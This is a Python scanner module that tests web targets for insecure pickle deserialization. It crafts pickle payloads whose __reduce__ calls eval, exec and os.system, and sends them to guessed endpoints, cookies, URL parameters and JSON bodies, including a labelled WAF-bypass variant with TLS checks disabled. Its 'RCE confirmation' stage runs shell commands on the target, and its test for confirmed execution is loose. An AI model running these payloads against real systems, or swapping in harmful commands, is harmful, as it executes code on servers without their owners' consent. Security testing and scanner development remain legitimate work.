"""Python pickle deserialization — detect and test for insecure deserialization, RCE confirmation."""

import httpx
import urllib.parse
import re
import asyncio
import base64
import json
import pickle
import os
import io
import struct


PICKLE_MAGIC = b"\x80\x04\x95"
SHELVE_MAGIC = b"\x03\xdf\x3d"
MARSHAL_MAGIC = b"\xc3\x00"


DESERIALIZE_ENDPOINTS = [
    "/deserialize", "/unserialize", "/load", "/restore",
    "/import", "/pickle", "/marshal", "/session/load",
    "/api/import", "/api/load", "/api/deserialize",
    "/admin/load", "/admin/import", "/admin/restore",
    "/debug/load", "/debug/import", "/dev/import",
    "/test/load", "/test/import",
]

COOKIE_PATTERNS = [
    (r"session=([A-Za-z0-9+/=]{20,})", "session"),
    (r"payload=([A-Za-z0-9+/=]{20,})", "payload"),
    (r"data=([A-Za-z0-9+/=]{20,})", "data"),
    (r"token=([A-Za-z0-9+/=]{20,})", "token"),
    (r"state=([A-Za-z0-9+/=]{20,})", "state"),
    (r"__session__=([A-Za-z0-9+/=]{20,})", "session"),
    (r"flask=([A-Za-z0-9+/=]{20,})", "flask"),
    (r"cookie=([A-Za-z0-9+/=]{20,})", "cookie"),
]

BODY_CONTENT_TYPES = [
    "application/octet-stream",
    "application/x-python-serialize",
    "application/x-pickle",
    "application/x-marshal",
    "application/x-dill",
]

SERIALIZE_FORMATS = [
    "pickle", "shelve", "marshal", "dill", "cloudpickle",
]


def _make_pickle_payloads() -> list[tuple[str, bytes, str]]:
    """Generate harmless pickle probe payloads."""
    payloads = []

    class ProbeMarker:
        def __reduce__(self):
            return (str, ("PICKLE_PROBE_ACTIVE",))

    class ProbeEcho:
        def __reduce__(self):
            return (eval, ("'PROBE_ECHO'",))

    class ProbeExec:
        def __reduce__(self):
            return (exec, ("import sys; sys.stdout.write('PICKLE_EXEC')",))

    try:
        payloads.append(("probe_marker", pickle.dumps(ProbeMarker()), "marker"))
    except Exception:
        pass

    try:
        payloads.append(("probe_echo", pickle.dumps(ProbeEcho()), "echo"))
    except Exception:
        pass

    try:
        payloads.append(("probe_exec", pickle.dumps(ProbeExec()), "exec"))
    except Exception:
        pass

    class SimpleObj:
        def __reduce__(self):
            return (str, ("pickle_test_object",))

    try:
        payloads.append(("simple_obj", pickle.dumps(SimpleObj()), "object"))
    except Exception:
        pass

    try:
        payloads.append(("bytes_direct", b"\x80\x04\x95\x0c\x00\x00\x00\x00\x00\x00\x00\x8c\x0bpickle_test\x94.", "raw_bytes"))
    except Exception:
        pass

    return payloads


def _make_rce_confirmation_payloads() -> list[tuple[str, bytes, str]]:
    """Generate harmless RCE confirmation payloads."""
    payloads = []

    class TouchFile:
        def __reduce__(self):
            return (eval, ("__import__('os').system('touch /tmp/pickle_rce_confirmed')",))

    class EchoMarker:
        def __reduce__(self):
            return (eval, ("'RCE_CONFIRMED'",))

    class harmless_exec:
        def __reduce__(self):
            return (exec, ("import os; os.system('echo PICKLE_RCE > /tmp/pickle_test')",))

    try:
        payloads.append(("touch_file", pickle.dumps(TouchFile()), "os.system touch"))
    except Exception:
        pass

    try:
        payloads.append(("echo_marker", pickle.dumps(EchoMarker()), "eval echo"))
    except Exception:
        pass

    try:
        payloads.append(("harmless_exec", pickle.dumps(harmless_exec()), "exec system"))
    except Exception:
        pass

    return payloads


def _detect_pickle_in_response(body: str, headers: dict) -> list[dict]:
    """Detect pickle/serialization indicators in response."""
    findings = []
    indicators = [
        (r"pickle", "pickle_reference"),
        (r"UnpicklingError", "unpickling_error"),
        (r"unpickle", "unpickle_reference"),
        (r"_reconstruct", "reconstruct_method"),
        (r"__reduce__", "reduce_method"),
        (r"marshal", "marshal_reference"),
        (r"shelve", "shelve_reference"),
        (r"serializ", "serialization_reference"),
        (r"deserializ", "deserialization_reference"),
        (r"loads?\s*\(", "loads_function"),
        (r"ImportError", "import_error"),
        (r"ModuleNotFoundError", "module_not_found"),
    ]
    for pattern, name in indicators:
        if re.search(pattern, body, re.IGNORECASE):
            idx = body.lower().find(pattern.replace("\\s", " ").lower().split("(")[0])
            start = max(0, idx - 40) if idx != -1 else 0
            end = min(len(body), idx + 120) if idx != -1 else 300
            findings.append({
                "indicator": name,
                "snippet": body[start:end],
            })
    content_type = headers.get("content-type", "").lower()
    if any(ct in content_type for ct in BODY_CONTENT_TYPES):
        findings.append({"indicator": "serialize_content_type", "content_type": content_type})
    return findings


def _detect_pickle_magic(body: bytes) -> list[dict]:
    """Detect pickle magic bytes in binary content."""
    findings = []
    if PICKLE_MAGIC in body:
        idx = body.find(PICKLE_MAGIC)
        findings.append({"type": "pickle_magic", "offset": idx, "hex": body[idx:idx+10].hex()})
    if SHELVE_MAGIC in body:
        idx = body.find(SHELVE_MAGIC)
        findings.append({"type": "shelve_magic", "offset": idx, "hex": body[idx:idx+10].hex()})
    if MARSHAL_MAGIC in body:
        idx = body.find(MARSHAL_MAGIC)
        findings.append({"type": "marshal_magic", "offset": idx, "hex": body[idx:idx+10].hex()})
    return findings


def _decode_possible_payloads(body: str) -> list[tuple[str, bytes]]:
    """Try to decode possible serialized payloads from response."""
    decoded = []
    b64_pattern = r"[A-Za-z0-9+/]{40,}={0,2}"
    for match in re.finditer(b64_pattern, body):
        try:
            raw = base64.b64decode(match.group())
            if PICKLE_MAGIC in raw or len(raw) > 20:
                decoded.append((f"b64_at_{match.start()}", raw))
        except Exception:
            continue
    hex_pattern = r"(?:\\x[0-9a-fA-F]{2}){10,}"
    for match in re.finditer(hex_pattern, body):
        try:
            raw = match.group().encode().decode("unicode_escape").encode("latin-1")
            if PICKLE_MAGIC in raw:
                decoded.append((f"hex_at_{match.start()}", raw))
        except Exception:
            continue
    return decoded[:10]


async def pickle_deserialize(target: str) -> dict:
    """Pickle deserialization detection — probe endpoints, detect pickle magic bytes, test cookie deserialization, RCE confirmation."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path or "/"
    results = []

    probe_payloads = _make_pickle_payloads()
    rce_payloads = _make_rce_confirmation_payloads()

    async with httpx.AsyncClient(timeout=12.0, verify=False, follow_redirects=True) as client:
        # Get baseline
        baseline_status = 0
        baseline_body = ""
        baseline_cookies = {}
        try:
            resp = await client.get(target)
            baseline_status = resp.status_code
            baseline_body = resp.text
            baseline_cookies = dict(resp.cookies)
        except Exception:
            pass

        # --- Test 1: Check for pickle magic bytes in response ---
        try:
            resp = await client.get(target)
            magic_findings = _detect_pickle_magic(resp.content)
            if magic_findings:
                results.append({
                    "technique": "magic_bytes_detected",
                    "findings": magic_findings,
                    "status": resp.status_code,
                    "risk": "CRITICAL",
                    "confidence": "high",
                    "evidence": f"Pickle magic bytes found in response: {magic_findings[0]}",
                })
        except Exception:
            pass

        # --- Test 2: Check cookies for serialized data ---
        for cookie_name, cookie_val in baseline_cookies.items():
            if len(cookie_val) > 20:
                try:
                    decoded = base64.b64decode(cookie_val)
                    magic = _detect_pickle_magic(decoded)
                    if magic:
                        results.append({
                            "technique": "cookie_deserialization",
                            "cookie": cookie_name,
                            "magic": magic,
                            "risk": "CRITICAL",
                            "confidence": "high",
                            "evidence": f"Cookie '{cookie_name}' contains pickle data",
                        })
                except Exception:
                    pass
                decoded_list = _decode_possible_payloads(cookie_val)
                for name, raw in decoded_list:
                    magic = _detect_pickle_magic(raw)
                    if magic:
                        results.append({
                            "technique": "cookie_encoded_deserialization",
                            "cookie": cookie_name,
                            "decoder": name,
                            "magic": magic,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })

        # --- Test 3: Probe known deserialization endpoints ---
        for endpoint in DESERIALIZE_ENDPOINTS:
            for probe_name, probe_bytes, probe_type in probe_payloads:
                try:
                    url = f"{base}{endpoint}"
                    headers = {"Content-Type": "application/octet-stream"}
                    resp = await client.post(url, content=probe_bytes, headers=headers)
                    body = resp.text
                    resp_headers = dict(resp.headers)

                    if resp.status_code != 404:
                        deserialize_indicators = _detect_pickle_in_response(body, resp_headers)
                        if deserialize_indicators or resp.status_code == 200:
                            results.append({
                                "technique": "endpoint_probe",
                                "endpoint": endpoint,
                                "probe": probe_name,
                                "probe_type": probe_type,
                                "status": resp.status_code,
                                "indicators": deserialize_indicators,
                                "risk": "HIGH",
                                "confidence": "high" if deserialize_indicators else "medium",
                            })
                            break
                except Exception:
                    continue

        # --- Test 4: Send pickle payloads as URL params ---
        for probe_name, probe_bytes, probe_type in probe_payloads:
            b64_payload = base64.b64encode(probe_bytes).decode()
            for param in ["data", "payload", "state", "token", "import", "load", "session"]:
                try:
                    url = f"{base}{path}?{urllib.parse.urlencode({param: b64_payload})}"
                    resp = await client.get(url)
                    body = resp.text
                    resp_headers = dict(resp.headers)

                    indicators = _detect_pickle_in_response(body, resp_headers)
                    magic = _detect_pickle_magic(resp.content)

                    if indicators or magic:
                        results.append({
                            "technique": "param_deserialization",
                            "param": param,
                            "probe": probe_name,
                            "indicators": indicators,
                            "magic": magic,
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Test 5: Send pickle in POST body with various Content-Types ---
        for content_type in BODY_CONTENT_TYPES + ["application/json", "text/plain"]:
            for probe_name, probe_bytes, probe_type in probe_payloads[:3]:
                try:
                    headers = {"Content-Type": content_type}
                    resp = await client.post(base, content=probe_bytes, headers=headers)
                    body = resp.text
                    resp_headers = dict(resp.headers)

                    indicators = _detect_pickle_in_response(body, resp_headers)
                    if indicators:
                        results.append({
                            "technique": "post_body_deserialization",
                            "content_type": content_type,
                            "probe": probe_name,
                            "indicators": indicators,
                            "status": resp.status_code,
                            "risk": "HIGH",
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Test 6: RCE confirmation payloads ---
        rce_confirmed = False
        for rce_name, rce_bytes, rce_type in rce_payloads:
            if rce_confirmed:
                break
            for endpoint in DESERIALIZE_ENDPOINTS[:5]:
                try:
                    url = f"{base}{endpoint}"
                    headers = {"Content-Type": "application/octet-stream"}
                    resp = await client.post(url, content=rce_bytes, headers=headers)
                    body = resp.text

                    rce_indicators = [
                        "RCE_CONFIRMED", "pickle_rce", "PICKLE_RCE",
                        "touch: cannot touch", "No such file",
                    ]
                    has_rce = any(ind in body for ind in rce_indicators)
                    if has_rce or ("pickle" in body.lower() and resp.status_code == 200):
                        results.append({
                            "technique": "rce_confirmed",
                            "endpoint": endpoint,
                            "rce_payload": rce_name,
                            "rce_type": rce_type,
                            "status": resp.status_code,
                            "evidence": body[:200],
                            "risk": "CRITICAL",
                            "confidence": "confirmed",
                        })
                        rce_confirmed = True
                        break
                except Exception:
                    continue

        # --- Test 7: Test session deserialization ---
        session_endpoints = [
            f"{base}/session", f"{base}/sessions", f"{base}/api/session",
            f"{base}/api/sessions", f"{base}/debug/session",
        ]
        for endpoint in session_endpoints:
            try:
                resp = await client.get(endpoint)
                if resp.status_code == 200:
                    magic = _detect_pickle_magic(resp.content)
                    decoded = _decode_possible_payloads(resp.text)
                    for name, raw in decoded:
                        magic.extend(_detect_pickle_magic(raw))
                    if magic:
                        results.append({
                            "technique": "session_deserialization",
                            "endpoint": endpoint,
                            "magic": magic,
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
            except Exception:
                continue

        # --- Test 8: WAF bypass with base64+gzip ---
        for probe_name, probe_bytes, probe_type in probe_payloads[:2]:
            try:
                import gzip
                compressed = gzip.compress(probe_bytes)
                b64_compressed = base64.b64encode(compressed).decode()
                for param in ["data", "payload", "import"]:
                    url = f"{base}{path}?{urllib.parse.urlencode({param: b64_compressed})}"
                    headers = {"Content-Encoding": "gzip", "Content-Type": "application/octet-stream"}
                    resp = await client.get(url, headers=headers)
                    body = resp.text
                    indicators = _detect_pickle_in_response(body, dict(resp.headers))
                    if indicators:
                        results.append({
                            "technique": "compressed_deserialization",
                            "param": param,
                            "probe": probe_name,
                            "encoding": "gzip+base64",
                            "indicators": indicators,
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break
            except Exception:
                continue

        # --- Test 9: Nested pickle in JSON ---
        for probe_name, probe_bytes, probe_type in probe_payloads[:3]:
            b64_payload = base64.b64encode(probe_bytes).decode()
            try:
                data = {
                    "data": b64_payload,
                    "session": b64_payload,
                    "import": b64_payload,
                    "payload": b64_payload,
                }
                headers = {"Content-Type": "application/json"}
                resp = await client.post(base, json=data, headers=headers)
                body = resp.text
                indicators = _detect_pickle_in_response(body, dict(resp.headers))
                if indicators:
                    results.append({
                        "technique": "json_wrapped_deserialization",
                        "probe": probe_name,
                        "indicators": indicators,
                        "status": resp.status_code,
                        "risk": "HIGH",
                        "confidence": "high",
                    })
            except Exception:
                continue

        # --- Test 10: Detect serialization in HTML forms ---
        try:
            resp = await client.get(target)
            form_pattern = r'<input[^>]*name=["\']?(\w+)["\']?[^>]*value=["\']([^"\']{20,})["\']'
            forms = re.findall(form_pattern, resp.text, re.IGNORECASE)
            for field_name, value in forms:
                try:
                    decoded = base64.b64decode(value)
                    magic = _detect_pickle_magic(decoded)
                    if magic:
                        results.append({
                            "technique": "form_hidden_deserialization",
                            "field": field_name,
                            "magic": magic,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                except Exception:
                    continue
        except Exception:
            pass

        # --- Test 11: Detect serialized data in API responses ---
        api_endpoints = [f"{base}/api", f"{base}/api/data", f"{base}/api/state",
                         f"{base}/api/export", f"{base}/api/backup"]
        for endpoint in api_endpoints:
            try:
                resp = await client.get(endpoint)
                if resp.status_code == 200:
                    magic = _detect_pickle_magic(resp.content)
                    decoded = _decode_possible_payloads(resp.text)
                    for name, raw in decoded:
                        magic.extend(_detect_pickle_magic(raw))
                    if magic:
                        results.append({
                            "technique": "api_serialized_data",
                            "endpoint": endpoint,
                            "magic": magic,
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
            except Exception:
                continue

    return {
        "target": target,
        "results": results,
        "vulnerable": len(results) > 0,
        "total_findings": len(results),
        "techniques_found": list(set(r["technique"] for r in results)),
        "risk_summary": {
            "critical": sum(1 for r in results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
        },
    }
